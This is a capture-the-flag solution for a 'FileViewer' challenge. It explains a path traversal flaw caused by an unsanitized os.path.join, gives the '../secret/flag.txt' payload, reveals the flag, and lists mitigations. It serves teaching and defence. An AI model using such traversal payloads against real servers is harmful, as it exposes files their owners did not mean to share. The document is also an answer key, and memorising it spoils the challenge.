# Challenge 04: FileViewer - Solution

## Vulnerability Type
**Path Traversal / Directory Traversal**

## Description
The application uses `os.path.join()` with unsanitized user input, allowing attackers to navigate outside the intended directory using relative path sequences.

## Vulnerable Code
```python
# VULNERABLE: path join without sanitization
path = os.path.join(FILES_DIR, filename)
```

## Exploitation Steps

1. The application expects files from `/app/files/` directory
2. The flag is stored at `/app/secret/flag.txt`
3. Use `../` sequences to traverse up directories
4. Navigate to: `/?file=../secret/flag.txt`

## Payload
```
?file=../secret/flag.txt
```

## Flag
```
FCTF{p4th_tr4v3rs4l_g0es_brrrr}
```

## How It Works
- `FILES_DIR = "/app/files"`
- User input: `../secret/flag.txt`
- `os.path.join("/app/files", "../secret/flag.txt")` = `/app/files/../secret/flag.txt`
- This resolves to: `/app/secret/flag.txt`

## Mitigation
- Validate and sanitize file paths
- Use `os.path.abspath()` and verify the result is within allowed directory:
  ```python
  path = os.path.abspath(os.path.join(FILES_DIR, filename))
  if not path.startswith(os.path.abspath(FILES_DIR)):
      abort(403)
  ```
- Use a whitelist of allowed files
- Never trust user input for file paths
- Consider using file IDs instead of filenames
